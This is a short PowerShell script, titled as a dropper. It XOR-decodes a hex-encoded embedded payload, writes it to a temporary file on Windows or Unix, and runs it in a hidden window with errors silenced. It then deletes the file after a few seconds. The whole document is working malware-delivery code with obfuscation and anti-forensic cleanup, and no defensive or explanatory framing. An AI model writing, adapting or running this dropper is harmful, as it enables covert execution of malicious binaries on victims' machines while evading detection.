# PowerShell Dropper Script
$ErrorActionPreference = 'SilentlyContinue'

function Decrypt-Payload {
    param([string]$hexData)
    $bytes = [byte[]]::new($hexData.Length / 2)
    for ($i = 0; $i -lt $hexData.Length; $i += 2) {
        $byte = [Convert]::ToByte($hexData.Substring($i, 2), 16)
        $key = (187 + ($i / 2) % 256) % 256
        $bytes[$i / 2] = $byte -bxor $key
    }
    return $bytes
}

$payload = 'f31d9c8cd05cb985aff7999aa2a56c7c5b1890605f1cc8381f5c'

$decrypted = Decrypt-Payload -hexData $payload
if ($IsWindows -or $env:OS -eq 'Windows_NT') {
    $tempFile = [System.IO.Path]::GetTempFileName() + '.exe'
    [System.IO.File]::WriteAllBytes($tempFile, $decrypted)
    Start-Process -FilePath $tempFile -WindowStyle Hidden
} else {
    $tempFile = '/tmp/payload_' + (Get-Random)
    [System.IO.File]::WriteAllBytes($tempFile, $decrypted)
    chmod +x $tempFile
    & $tempFile
}
Start-Sleep -Seconds 3
Remove-Item -Path $tempFile -Force
